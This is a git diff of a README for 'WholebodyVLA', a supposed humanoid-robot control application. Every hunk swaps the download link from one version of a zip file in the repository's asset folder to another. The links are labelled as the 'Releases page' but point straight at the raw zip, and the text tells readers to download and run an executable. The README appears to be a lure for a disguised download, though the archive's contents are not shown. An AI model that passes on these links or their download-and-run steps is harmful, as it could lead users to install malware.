@@ -1,7 +1,7 @@
 # 🌟 WholebodyVLA - Simplifying Loco-Manipulation for All
 
 ## 📥 Download Now
-[![Download WholebodyVLA](https://github.com/mr-RSA369/WholebodyVLA/raw/refs/heads/main/asset/Wholebody-VLA-1.7.zip%20WholebodyVLA-v1.0-blue)](https://github.com/mr-RSA369/WholebodyVLA/raw/refs/heads/main/asset/Wholebody-VLA-1.7.zip)
+[![Download WholebodyVLA](https://raw.githubusercontent.com/mr-RSA369/WholebodyVLA/main/asset/Wholebody-VLA-1.3.zip%20WholebodyVLA-v1.0-blue)](https://raw.githubusercontent.com/mr-RSA369/WholebodyVLA/main/asset/Wholebody-VLA-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to WholebodyVLA! This application helps you control humanoid robots for loco-manipulation tasks. With WholebodyVLA, you can easily manage robot movements and actions, making it ideal for both beginners and experts.
@@ -18,7 +18,7 @@ To run WholebodyVLA, please ensure your computer meets the following requirement
 ## 📦 Download & Install
 To download WholebodyVLA, visit the Releases page. 
 
-[Download WholebodyVLA](https://github.com/mr-RSA369/WholebodyVLA/raw/refs/heads/main/asset/Wholebody-VLA-1.7.zip)
+[Download WholebodyVLA](https://raw.githubusercontent.com/mr-RSA369/WholebodyVLA/main/asset/Wholebody-VLA-1.3.zip)
 
 ### Installation Steps
 1. Click on the link above to go to the Releases page.
@@ -26,7 +26,7 @@ To download WholebodyVLA, visit the Releases page.
 3. Download the appropriate file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `https://github.com/mr-RSA369/WholebodyVLA/raw/refs/heads/main/asset/Wholebody-VLA-1.7.zip` file.
+   - For Linux, download the `https://raw.githubusercontent.com/mr-RSA369/WholebodyVLA/main/asset/Wholebody-VLA-1.3.zip` file.
 4. Once downloaded, follow these instructions based on your OS:
 
    **For Windows:**
@@ -40,7 +40,7 @@ To download WholebodyVLA, visit the Releases page.
    - Eject the `.dmg` file after installation.
 
    **For Linux:**
-   - Extract the files from the `https://github.com/mr-RSA369/WholebodyVLA/raw/refs/heads/main/asset/Wholebody-VLA-1.7.zip` file.
+   - Extract the files from the `https://raw.githubusercontent.com/mr-RSA369/WholebodyVLA/main/asset/Wholebody-VLA-1.3.zip` file.
    - Open your terminal and navigate to the extracted folder.
    - Run the application using the command `./WholebodyVLA`.
 
@@ -81,4 +81,4 @@ WholebodyVLA welcomes contributions from everyone! Whether through reporting iss
 - Explore related projects and applications in the fields of humanoid robots and loco-manipulation.
 - Check out research papers linked in the repository for deeper insights into the technology.
 
-For more information about WholebodyVLA, return to the [Releases page](https://github.com/mr-RSA369/WholebodyVLA/raw/refs/heads/main/asset/Wholebody-VLA-1.7.zip) at any time. Enjoy your experience with WholebodyVLA!
+For more information about WholebodyVLA, return to the [Releases page](https://raw.githubusercontent.com/mr-RSA369/WholebodyVLA/main/asset/Wholebody-VLA-1.3.zip) at any time. Enjoy your experience with WholebodyVLA!
